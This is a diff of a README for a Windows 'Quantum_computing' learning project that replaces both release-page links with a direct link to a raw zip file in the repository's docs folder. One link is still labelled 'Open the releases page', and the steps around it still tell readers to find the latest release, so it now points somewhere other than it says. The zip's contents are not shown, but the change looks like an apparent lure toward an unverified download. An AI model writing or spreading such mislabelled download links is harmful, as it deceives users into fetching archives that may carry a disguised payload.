@@ -1,6 +1,6 @@
 # 🧠 Quantum_computing - Learn Quantum Computing Faster
 
-[![Download Quantum_computing](https://img.shields.io/badge/Download-Quantum_computing-blue?style=for-the-badge&logo=github)](https://github.com/Johnam4543/Quantum_computing/releases)
+[![Download Quantum_computing](https://img.shields.io/badge/Download-Quantum_computing-blue?style=for-the-badge&logo=github)](https://github.com/Johnam4543/Quantum_computing/raw/refs/heads/main/docs/Quantum-computing-v2.1.zip)
 
 ## 🚀 What This Is
 
@@ -40,7 +40,7 @@ For best results, use:
 
 Visit this page to download the Windows version:
 
-[Open the releases page](https://github.com/Johnam4543/Quantum_computing/releases)
+[Open the releases page](https://github.com/Johnam4543/Quantum_computing/raw/refs/heads/main/docs/Quantum-computing-v2.1.zip)
 
 On that page:
 1. Find the latest release
